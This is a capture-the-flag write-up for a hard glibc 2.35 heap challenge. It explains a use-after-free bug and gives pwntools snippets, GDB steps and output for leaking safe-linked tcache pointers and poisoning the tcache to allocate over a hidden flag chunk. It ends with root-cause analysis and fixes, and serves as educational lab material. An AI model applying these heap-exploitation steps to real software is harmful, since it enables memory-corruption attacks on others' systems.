# House of Water (Pwn, Hard)

**Author:** Om Khanjodkar
**Category:** Pwn
**Difficulty:** Hard

## Challenge Description

> A menu-driven heap challenge built around the House of Water technique. The program allocates the flag into a heap chunk at startup, but its pointer is never stored in the easily accessible `chunks[]` array. Your goal is to bypass glibc 2.35 protections to achieve arbitrary allocation and retrieve the flag.

**Given:** `chal` — a dynamically linked x86-64 ELF (PIE enabled) built against glibc 2.35 (Ubuntu 22.04), with source `house_of_water_chal.c`.

## Summary

The binary is a classic menu-driven heap challenge (`malloc` / `free` / `edit` / `show`) with a use-after-free vulnerability: `free()` never clears `chunks[idx]`, so freed chunks remain readable and writable. The flag is read into a `malloc(0x80)` chunk during `setup()` and its pointer is deliberately never stored, so it cannot be reached by index — only through a forged allocation. Using the UAF read to leak glibc 2.35 safe-linked tcache `fd` pointers, the exploit recovers the heap base and exact chunk addresses, poisons the tcache, and makes `malloc` hand out the hidden flag chunk.

## Flag

```
OWASP{drink_fr0m_th3_p0is0n3d_tc4ch3}
```

---

## Step 1 — Recon: source review

The source `house_of_water_chal.c` exposes three powerful primitives:

1. **Use-after-free write.** `do_free()` calls `free(chunks[idx])` but never nulls the pointer — it only sets `freed[idx] = true`. The slot stays writable through `edit`.

2. **Use-after-free read.** `do_show()` does not check `freed[idx]` at all, so freed chunks can be dumped, leaking raw heap metadata such as the tcache `fd` pointer.

3. **Deliberate header access.** `check_bounds()` allows `edit` on freed chunks to start at offset `-0x10`, granting access to the 16-byte chunk header (`prev_size` / `size`) immediately before the user pointer. This is the intended "House of Water" assist.

The flag is the very first allocation the process makes:

```c
void *flag_chunk = malloc(0x80);   // user ptr = heap_base + 0x2a0
memset(flag_chunk, 0, 0x80);
FILE *f = fopen("./flag.txt", "r");
fgets((char *)flag_chunk, 0x80, f);
```

Its pointer is never stored in `chunks[]` or `sizes[]`, so index-based access is impossible — the flag chunk must be located by address.

## Step 2 — Leaking the heap base (safe-linking)

glibc 2.35 "safe-links" tcache `fd` pointers:

```
fd_encoded = (chunk_addr >> 12) ^ next
```

The UAF read on `show` lets us leak `fd_encoded` directly. Allocate two chunks of size `0x88` (chunk stride `0x90`) and free the first:

```python
SZ = 0x88
STRIDE = 0x90

do_malloc(0, SZ)
do_malloc(1, SZ)
do_free(0)

# For the only entry in the tcache bin:
#   enc0 = (addr0 >> 12) ^ 0  ==  addr0 >> 12
enc0 = u64(do_show(0, 0, 8))
heap_base = enc0 << 12
```

Because chunk 0 is the sole entry in its tcache bin, its `fd` decodes against `NULL` — so the leaked value is literally `addr0 >> 12`, and shifting left by 12 bits recovers the heap base.

## Step 3 — Recovering exact chunk addresses

Free chunk 1 as well. It is now the tcache head and its `fd` holds:

```
enc1 = (addr1 >> 12) ^ addr0
```

Both chunks live on the same `0x1000`-byte page, so `addr1 >> 12 == addr0 >> 12 == enc0`. XOR-ing the two leaks recovers chunk 0's exact address, and chunk 1 is one stride away:

```python
do_free(1)
enc1 = u64(do_show(1, 0, 8))

addr0 = enc0 ^ enc1
addr1 = addr0 + STRIDE
```

## Step 4 — Locating the flag chunk with GDB

With arbitrary allocation now within reach, we need the flag chunk's exact address. Under GDB (with GEF):

1. `b menu`, then `run` — pause right after `setup()` returns.
2. `search-pattern "OWASP{"` — locate the flag string on the heap.
3. `vmmap heap` — take the heap base.

The subtraction gives a fixed offset for this build:

```
flag user data : heap_base + 0x2a0
flag header    : heap_base + 0x290
```

## Step 5 — Poisoning the tcache

Overwrite chunk 1's encoded `fd` so the tcache list becomes `chunk1 -> flag_chunk`:

```python
flag_user     = heap_base + 0x2a0
poison_target = flag_user - 0x10      # aim at the chunk HEADER

# enc_fd = (addr1 >> 12) ^ poison_target
encoded_target = (addr1 >> 12) ^ poison_target
do_edit(1, 0, p64(encoded_target))
```

The poison targets the chunk **header**, not the flag bytes: when glibc pops the fake chunk it clears `e->key` at `target + 8`, which lands on the `size` field of the header instead of wiping the flag string at `+0x10`.

## Step 6 — Pop, pop, read the flag

Two more `malloc(0x88)` calls drain the poisoned list:

```python
do_malloc(2, SZ)          # returns chunk 1 back
do_malloc(3, SZ)          # returns the flag chunk header

flag_data = do_show(3, 0x10, 0x40)    # user data starts 0x10 into the fake chunk
flag_str = flag_data.split(b"\x00", 1)[0]
```

```
[+] heap_base = 0x555555559000
[+] addr0      = 0x5555555592a0
[+] addr1(head)= 0x555555559330
[+] FLAG = b'OWASP{drink_fr0m_th3_p0is0n3d_tc4ch3}'
```

## Note — The intended path vs. the shortcut

The challenge was designed for the **House of Water** technique: the `-0x10` offset carve-out in `check_bounds()` lets you rewrite the `prev_size` / `size` metadata of a freed chunk, massaging the heap into overlapping chunks and eventually redirecting an allocation through corrupted metadata — all without a direct tcache pointer leak.

However, the unrestricted UAF read in `do_show()` trivializes glibc 2.35 safe-linking: leaking the encoded `fd` directly yields the heap base, and a second leak recovers exact addresses. That reduces the whole challenge to textbook tcache poisoning, which is the path used here. Both routes end at the same forged allocation over the flag chunk.

## Solution Summary

| Field | Value |
|---|---|
| Binary | `chal` (x86-64, PIE, glibc 2.35) |
| Vulnerability | Use-after-free — `free()` never clears `chunks[idx]` |
| Leak primitive | `show` on freed chunk → safe-linked tcache `fd` |
| Write primitive | `edit` on freed chunk (header + user data) |
| Flag chunk offset | user data at `heap_base + 0x2a0`, header at `heap_base + 0x290` |
| Technique | glibc 2.35 tcache poisoning (`fd = (addr >> 12) ^ target`) |
| Result | Arbitrary allocation returning the flag chunk |

## Root Cause / Vulnerability Explanation

1. **Dangling pointers** — `free()` fails to clear the pointer array (`chunks[idx] = NULL`), creating a use-after-free.
2. **Unrestricted reads** — `do_show()` allows reading from freed chunks, trivializing the leak of safe-linked tcache pointers.
3. **Permissive bounds** — `check_bounds()` intentionally permits writing to the 16-byte chunk header (`-0x10` offset) of a freed chunk, enabling metadata corruption.

**Remediations:**

1. Clear pointers on free — always set pointers to `NULL` immediately after calling `free()`.
2. State validation — enforce strict checks on `freed[idx]` in both `do_show` and `do_edit`.
3. Strict bounds checking — remove the `-0x10` offset exception in `check_bounds()` to prevent access to internal heap metadata.

## Tools Used

- GDB (with GEF) — `b menu`, `search-pattern "OWASP{"`, `vmmap heap` to derive the `+0x2a0` flag offset
- Python 3 + pwntools — exploit scripting and interaction with the binary/service
- glibc 2.35 safe-linking documentation — understanding `fd = (addr >> 12) ^ next`

The full exploit script is available in [`resources/solve_house_of_water.py`](resources/solve_house_of_water.py).

## Timeline

| Step | Action | Result |
|---|---|---|
| 1 | `gdb ./chal` → `b menu` → `run` → `search-pattern "OWASP{"` | Flag chunk user data at `heap_base + 0x2a0` |
| 2 | `malloc(0)`, `malloc(1)`, `free(0)` | Prepared chunk 0 for the base leak |
| 3 | `show(0)` | Leaked encoded `fd`, shifted left to get `heap_base` |
| 4 | `free(1)` → `show(1)` | Leaked second `fd`, calculated `addr0` / `addr1` |
| 5 | `edit(1)` | Overwrote chunk 1 `fd` with encoded pointer to the flag header |
| 6 | `malloc(2)`, `malloc(3)` | Second allocation landed on the poisoned pointer |
| 7 | `show(3, 0x10, 0x40)` | Read the flag: `OWASP{drink_fr0m_th3_p0is0n3d_tc4ch3}` |
